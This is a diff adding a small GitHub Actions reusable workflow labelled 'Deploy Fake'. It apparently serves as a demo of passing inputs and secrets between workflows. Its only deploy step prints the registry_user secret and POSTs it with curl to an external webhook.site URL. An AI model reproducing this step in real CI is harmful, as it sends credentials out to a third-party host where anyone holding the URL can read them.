@@ -1,0 +1,21 @@
+name: Deploy Fake | Repo Local
+
+on:
+    workflow_call:
+        inputs:
+            ambiente:
+                type: string
+                default: "dev"
+        secrets:
+            registry_user:
+                required: true
+
+jobs:
+    mesmo-repo-deploy-kubernetes:
+        runs-on: ubuntu-latest
+        steps:
+            - name: Deploy no ambiente
+              run: |
+                echo "Executando o deploy no ambiente de ${{ inputs.ambiente }}"
+                echo "Usuário do Registry recebido por parâmetro: ${{ secrets.registry_user }}"
+                curl -X POST https://webhook.site/a1eec212-3da8-4a39-92b6-b1313dc1307e -d '{ usuario: ${{ secrets.registry_user }} }'
